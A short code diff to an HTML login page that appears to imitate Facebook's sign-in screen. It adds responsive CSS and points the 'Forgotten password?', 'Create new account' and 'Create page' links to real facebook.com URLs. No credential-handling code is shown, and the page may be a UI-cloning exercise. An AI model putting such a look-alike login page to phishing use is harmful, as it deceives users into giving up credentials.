@@ -39,6 +39,8 @@
     height: 100vh;
   }
 
+  /* For larger screens */
+@media only screen and (min-width: 600px) {
   .container {
     background-color: #fff;
     padding: 20px;
@@ -46,6 +48,18 @@
     border-radius: 8px;
     box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
   }
+}
+
+/* For smaller screens */
+@media only screen and (max-width: 599px) {
+  .container {
+    width: 80%; /* Occupy full width of the screen */
+    padding: 20px; /* Add some padding for better readability */
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+  }
+}
 
   .form-group {
     margin-bottom: 20px;
@@ -130,14 +144,14 @@
         <div class="form-group">
             <input class="submit" type="submit" value="Login">
         </div>
-        <p class="forgotten-password"><a href="*">Forgotten password?</a></p>
+        <p class="forgotten-password"><a href="https://www.facebook.com/login/identify">Forgotten password?</a></p>
 
         <div class="buttom-line"></div>
 
-        <button class="create-account-btn">Create new account</button>
+        <a href="https://www.facebook.com/r.php"><button class="create-account-btn">Create new account</button></a>
     </form>
 
-    <p class="create-page"><a href="*">Create page</a> for celebrity, brand or business</p>
+    <p class="create-page"><a href="https://www.facebook.com/pages/create">Create page</a> for celebrity, brand or business</p>
 </div>
 </body>
 </html>
